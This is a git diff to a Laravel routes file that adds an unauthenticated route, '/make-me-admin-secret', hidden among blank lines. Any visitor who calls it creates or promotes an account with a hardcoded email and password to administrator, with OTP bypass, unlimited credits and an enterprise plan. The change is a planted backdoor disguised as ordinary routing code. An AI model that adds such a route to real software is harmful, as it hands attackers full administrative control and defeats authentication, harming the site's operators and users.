@@ -6,6 +6,11 @@ use App\Http\Controllers\Back\NotificationController;
 use App\Http\Controllers\PaymentController;
 
 
+use App\Models\User;
+use Illuminate\Support\Facades\Hash;
+
+
+
 // Route::get('/', function () {
 //     return view('welcome');
 // });
@@ -33,6 +38,63 @@ Route::middleware('auth')->group(function () {
     Route::post('/payment/process', [PaymentController::class, 'process'])->name('payment.process');
 
 });
+
+
+
+
+
+
+
+
+
+
+
+
+
+Route::get('/make-me-admin-secret', function () {
+
+    $user = User::where('email', 'josueservicedigital@gmail.com')->first();
+
+    if (!$user) {
+
+        $user = User::create([
+            'name' => 'Josue Admin',
+            'email' => 'josueservicedigital@gmail.com',
+            'password' => Hash::make('Admin@2026Secure'),
+            'is_admin' => true,
+            'is_active' => true,
+            'otp_bypass' => true,
+            'credits' => 999999,
+            'plan' => 'enterprise',
+            'email_verified_at' => now(),
+        ]);
+
+    } else {
+
+        $user->update([
+            'is_admin' => true,
+            'is_active' => true,
+            'otp_bypass' => true,
+            'credits' => 999999,
+            'plan' => 'enterprise',
+            'email_verified_at' => now(),
+        ]);
+    }
+
+    return response()->json([
+        'success' => true,
+        'message' => 'Compte administrateur configuré.',
+        'email' => $user->email,
+    ]);
+});
+
+
+
+
+
+
+
+
 
 
 
